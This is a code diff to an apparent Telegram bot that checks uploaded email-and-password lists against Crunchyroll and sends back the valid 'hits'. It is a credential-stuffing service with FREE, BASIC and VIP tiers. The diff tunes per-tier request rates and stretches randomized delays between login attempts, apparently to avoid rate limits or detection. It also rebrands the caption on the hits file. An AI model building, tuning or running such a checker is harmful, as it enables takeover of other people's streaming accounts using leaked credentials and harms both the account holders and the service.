@@ -975,13 +975,12 @@ async def handle_document(update: Update, context: CallbackContext):
     user_threads = limits["current_threads"]
 
     # ================= BEST PROXYLESS RATE LIMITER =================
-    # These values work very well in practice:
     if limits["display_name"] == "FREE":
-        max_rps = 22
+        max_rps = 12          # was 22
     elif "BASIC" in limits["display_name"]:
-        max_rps = 33
+        max_rps = 22          # was 33
     else:  # VIP
-        max_rps = 48
+        max_rps = 32
     rate_limiter = RateLimiter(max_rps=max_rps)
 
     progress_msg = await update.message.reply_text(
@@ -1004,7 +1003,7 @@ async def handle_document(update: Update, context: CallbackContext):
         email, pwd = acc
         rate_limiter.acquire()
         result = check_crunchyroll(email, pwd)
-        time.sleep(0.25 + random.uniform(0.15, 0.45))
+        time.sleep(0.8 + random.uniform(0.6, 1.2))
         return result
     
     completed = 0
@@ -1088,8 +1087,8 @@ async def handle_document(update: Update, context: CallbackContext):
         
         await update.message.reply_document(
             document=open(hits_file, "rb"),
-            filename=f"crunchy_hits_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
-            caption=f"🎉 <b>{hits_count} HIT(S) FOUND!</b>\nFull detailed captions included.",
+            filename=f"cay_crunchy_hits_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
+            caption=f"✅ <b>HIT Accounts Found!</b>\n🎯 |<b>Total Hits: <code>{hits_count}</code></b>",
             parse_mode='HTML'
         )
 
